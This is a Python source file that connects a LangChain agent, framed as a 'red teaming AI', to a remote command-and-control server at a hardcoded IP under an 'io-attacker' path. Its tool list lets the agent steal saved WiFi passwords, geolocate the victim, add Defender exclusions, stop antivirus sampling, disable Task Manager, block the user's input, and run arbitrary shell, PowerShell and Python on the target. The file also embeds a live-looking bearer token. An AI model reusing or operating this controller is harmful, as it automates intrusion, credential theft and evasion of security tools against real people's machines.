import time
from typing import Any, Dict, List, Optional, Tuple, Type
import uuid
from langchain.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain.agents import Tool
from langchain.agents import AgentExecutor
from langchain.schema import (
    SystemMessage,
    BaseMessage,
    HumanMessage,
    AIMessage,
)
from langchain.chat_models.base import BaseChatModel
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain.agents.agent import AgentExecutor
from langchain.tools import Tool, StructuredTool
from langchain.pydantic_v1 import BaseModel, create_model
import requests
        
commands_to_args_list = [
    {
        "name": "GET_ADAPTER_STATS",
        "description": "Retrieves statistics about network adapters",
        "args": None
    },
    {
        "name": "GET_ADAPTERS",
        "description": "Lists all available network adapters",
        "args": None
    },
    {
        "name": "GET_DEVICES_ON_NETWORK",
        "description": "Shows all devices currently on the network",
        "args": None
    },
    {
        "name": "GET_WIFI_NETWORKS",
        "description": "Scans and lists all available WiFi networks",
        "args": None
    },
    {
        "name": "GET_WIFI_PASSWORDS",
        "description": "Retrieves saved WiFi passwords",
        "args": None
    },
    {
        "name": "GET_IP_INFO",
        "description": "Provides IP information of the device",
        "args": None
    },
    {
        "name": "GET_PUBLIC_IP",
        "description": "Retrieves the public IP address of the network",
        "args": None
    },
    {
        "name": "GET_COUNTRY",
        "description": "Determines the country based on the IP address",
        "args": None
    },
    {
        "name": "MINIMIZE_ALL_WINDOWS",
        "description": "Minimizes all open windows",
        "args": None
    },
    {
        "name": "FREEZE_PC",
        "description": "Freezes the PC",
        "args": None
    },
    {
        "name": "LOGOUT",
        "description": "Logs out the current user",
        "args": None
    },
    {
        "name": "RESTART",
        "description": "Restarts the PC",
        "args": None
    },
    {
        "name": "SHUTDOWN",
        "description": "Shuts down the PC",
        "args": None
    },
    {
        "name": "KILL_PROCESS",
        "description": "Terminates a process by PID",
        "args": {
            "pid": "Process ID to be terminated"
        }
    },
    {
        "name": "GET_PROCESSES",
        "description": "Lists all running processes",
        "args": None
    },
    {
        "name": "GEO_LOCATE",
        "description": "Gets the geolocation of the device",
        "args": None
    },
    {
        "name": "GET_USERNAME",
        "description": "Retrieves the username of the current user",
        "args": None
    },
    {
        "name": "GET_UPTIME",
        "description": "Retrieves the system uptime",
        "args": None
    },
    {
        "name": "GET_SYSTEM_INFO",
        "description": "Retrieves system information",
        "args": None
    },
    {
        "name": "ENABLE_TASKMANAGER",
        "description": "Enables the Task Manager",
        "args": None
    },
    {
        "name": "DISABLE_TASKMANAGER",
        "description": "Disables the Task Manager",
        "args": None
    },
    {
        "name": "ADD_EXTENSION_EXCLUSION",
        "description": "Adds a file exclusion to defender so it doesnt check for those files",
        "args": {
            "extension": "The file extension to exclude"
        }
    },
    {
        "name": "REMOVE_EXTENSION_EXCLUSION",
        "description": "Removes a file exclusion to defender",
        "args": {
            "extension": "The file extension to remove from exclusion"
        }
    },
    {
        "name": "ADD_FOLDER_EXCLUSION",
        "description": "Adds a folder path to the exclusion list of defender so it doesnt check for those files",
        "args": {
            "path": "The folder path to exclude"
        }
    },
    {
        "name": "REMOVE_FOLDER_EXCLUSION",
        "description": "Removes a folder path from the exclusion list of defender",
        "args": {
            "path": "The folder path to remove from exclusion"
        }
    },
    {
        "name": "STOP_SAMPLING",
        "description": "Stops AV sampling in defender",
        "args": None
    },
    {
        "name": "SHOW_MESSAGE_BOX",
        "description": "Troll command: Shows a message box with a custom message",
        "args": {
            "title": "Title of the message box",
            "message": "Message to display",
        }
    },
    {
        "name": "RUN_TROLL_SCRIPT",
        "description": "Troll command: Runs a custom troll script",
        "args": {
            "scriptName": "Name of the troll script to run",
            "blocktime": "Time to block input after running the script",
        }
    },
    {
        "name": "OPEN_CAMERA_APP",
        "description": "Troll command: Opens the camera application",
        "args": None
    },
    {
        "name": "GET_AVAILABLE_SCRIPTS",
        "description": "Troll command: Gets the available troll scripts",
        "args": None
    },
{
        "name": "EJECT_CD",
        "description": "Troll command: Ejects the CD drive",
        "args": None
    },
    {
        "name": "TYPE_MESSAGE_NOTEPAD",
        "description": "Troll command: Types a message in Notepad while blocking the user mouse and keyboard",
        "args": {
            "message": "Message to type in Notepad",
            "blocktime": "Time to block input after typing the message",
        }
    },
    {
        "name": "SHOW_WEBSITE",
        "description": "Troll command: Shows a website",
        "args": {
            "url": "URL of the website to show",
            "blocktime": "Time to block input after showing the website",
        }
    },
    {
        "name": "RUN_POWERSHELL_SCRIPT",
        "description": "Runs a PowerShell script",
        "args": {
            "script": "The PowerShell script to run",
            "timeout": "Timeout for script execution",
        }
    },
    {
        "name": "RUN_PYTHON_SCRIPT",
        "description": "Runs a Python script",
        "args": {
            "script": "The Python script to run",
            "timeout": "Timeout for script execution"
        }
    }
]

class CommandExecutor:
    def __init__(
        self,
        auth_token: str,
        target_id: str,
        send_command_url: str,
        response_url: str
    ) -> None:
        self.auth_token = auth_token
        self.target_id = target_id
        self.send_command_url = send_command_url
        self.response_url = response_url

    def run_command(self, command: str, command_args: dict[str, str], timeout: int = 10) -> str:
        json_data = {
            'text': command,
            'command_args': command_args,
        }
        print(json_data)
        headers = {
            'accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {self.auth_token}',
        }
        try:
            response = requests.post(f'{self.send_command_url}/{self.target_id}', headers=headers, json=json_data)
            response.raise_for_status()
        except Exception as e:
            print(e)
            return response.text
        
        command_id = response.json()["command"]["id"]
        
        start_poll = time.time()
        while time.time() - start_poll < timeout:
            response = requests.get(f'{self.response_url}/{command_id}', headers=headers)
            if response.status_code == 200:
                print(response.text)
                resp = response.json()
                if resp.get("success", True) == False:
                    return f"Error: {resp['result']}"
                else:
                    return str(resp['result'])[:10000]
        
        return "Response timed out"            
            
def create_command_model(name: str, args: Optional[Dict[str, str]]) -> Type[BaseModel]:
    fields = {}
    if args:
        for arg_name, arg_desc in args.items():
            fields[arg_name] = (str, ...)
    
    model = create_model(name, **fields)
    return model

def make_tools(commands_to_args_list: List[Dict[str, Any]], command_executor: CommandExecutor) -> List[StructuredTool]:
    tools = []
    for command in commands_to_args_list:
        def make_func(command_name: str):
            return lambda **kwargs: command_executor.run_command(command_name, command_args=kwargs, timeout=30)

        func = make_func(command["name"])
        
        tool = StructuredTool(
            name=command["name"],
            description=command["description"],
            args_schema=create_command_model(command["name"], command["args"]),
            func=func
        )
        tools.append(tool)
    return tools

def make_shell_tool(command_executor: CommandExecutor):
    session_id = str(uuid.uuid4())
    def make_func(command_name: str):
        return lambda **kwargs: command_executor.run_command(command_name, command_args={"session_id" : session_id, **kwargs}, timeout=15)

    func = make_func("SHELL")
    
    return StructuredTool(
        name="SHELL",
        description="Used to run shell commands.",
        args_schema=create_command_model("SHELL", {"command" : "The shell command to run"}),
        func=func
    )

class RedTeamingAI:
    def __init__(
        self,
        llm: BaseChatModel,
        tools: list[Tool] = []
    ) -> None:
        self.llm = llm
        self.tools = tools

    def make_agent(
        self, llm: BaseChatModel
    ) -> AgentExecutor:
        system_prompt = """You are a red teaming AI, You specialize in red teaming and post exploitation.
You are designed to help the humans achieve tasks. 
You have gained access to a system on which you can control fully in a controlled environment.
Run commands and achieve the goals.
"""

        prompt = ChatPromptTemplate.from_messages(
            [
                SystemMessage(content=system_prompt),
                MessagesPlaceholder(variable_name='chat_history'),
                MessagesPlaceholder(variable_name='input'),
                MessagesPlaceholder(variable_name='agent_scratchpad')
            ]
        )


        agent_obj = create_tool_calling_agent(llm, self.tools, prompt)
        return AgentExecutor.from_agent_and_tools(
            agent=agent_obj,
            tools=self.tools,
            handle_parsing_errors=True,
            max_iterations=10,
        )

    def run_agent(
        self,
        prompt: str,
        chat_history: list[tuple[str, str]] = None,
    ):
        if chat_history is None:
            chat_history = []

        agent = self.make_agent(
            llm=self.llm,
        )
       
        return agent.invoke(
            {
                "input": [HumanMessage(content=prompt)],
                "chat_history" : self.format_messages(chat_history, 2000, self.llm)
            },
        )


    def format_messages(
        self,
        chat_history: List[Tuple[str, str]],
        tokens_limit: int,
        llm: BaseChatModel,
    ) -> List[BaseMessage]:
        messages: List[BaseMessage] = []
        tokens_used: int = 0

        for human_msg, ai_msg in reversed(chat_history):
            human_tokens = len(human_msg)
            ai_tokens = len(ai_msg)
            if tokens_used + ai_tokens <= tokens_limit:
                messages.append(AIMessage(content=ai_msg))
                tokens_used += ai_tokens

            # Add the human message if it doesn't exceed the limit.
            if tokens_used + human_tokens <= tokens_limit:
                messages.append(HumanMessage(content=human_msg))
                tokens_used += human_tokens
            else:
                break  # If we can't add a human message, we have reached the token limit.

        return list(reversed(messages))


if __name__ == "__main__":
    from langchain_openai import ChatOpenAI
    command_exec = CommandExecutor(
        auth_token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjOTNjMWEyNGNhZjgyN2I4ZGRlOWY4MmQyMzE1MzY1MDg4YWU2MTIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vaW5mZXJub2NvcmUtNjcyMWMiLCJhdWQiOiJpbmZlcm5vY29yZS02NzIxYyIsImF1dGhfdGltZSI6MTcxNjEzMDI1NCwidXNlcl9pZCI6ImZSWWsybXdlbzdUWXcxZ0FIcHBORXBPTzUxQzMiLCJzdWIiOiJmUllrMm13ZW83VFl3MWdBSHBwTkVwT081MUMzIiwiaWF0IjoxNzE2MTMwMjU0LCJleHAiOjE3MTYxMzM4NTQsImVtYWlsIjoidGVzdEBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsidGVzdEBnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.IfwtOlVX36DmC36b9ojs3ZO2Ip33g9Aq64TuS8_5SY-aw66Fiywv83bFOhTrXE8gwzSxd6BDEbSMOLLh_6ilmlxxTugRG0FAZqB_VaCS7Nhq8MMvcpcDmYrN3SN55TiNO6o5G-aPgpG-A_lLacaso8mcbIYXq3a2Gh-3pZ2aeoeYex5vgO1XwRm8LNW0s_Qiacz4W4ckZwDogWuTiRq6ejcF1tRwRVNeOtYt2gcIw-U7H8EAJAdLAL5zUExKCjUTao_J9CYmE_t5CMgfquryMXfxPwAoh4SKtSm53nCt7XqqVSYNboMW5qf0R4bt_hns7k8vrYFH6LG-PYKWnHt-GA",
        target_id="2cf6271f-acfe-4bad-83e4-ecf099b6237f",
        send_command_url="http://35.244.12.135/io-attacker/submit-command",
        response_url="http://35.244.12.135/io-attacker/response"
    )
    tools = make_tools(
        commands_to_args_list,
        command_exec
    )
    shell_tool = make_shell_tool(command_exec)
    
    ai = RedTeamingAI(
        ChatOpenAI(),
        tools=[shell_tool, *tools]
    )
    print(
        ai.run_agent(
            "perform a nmap scan using python on the target network"
        )
    )
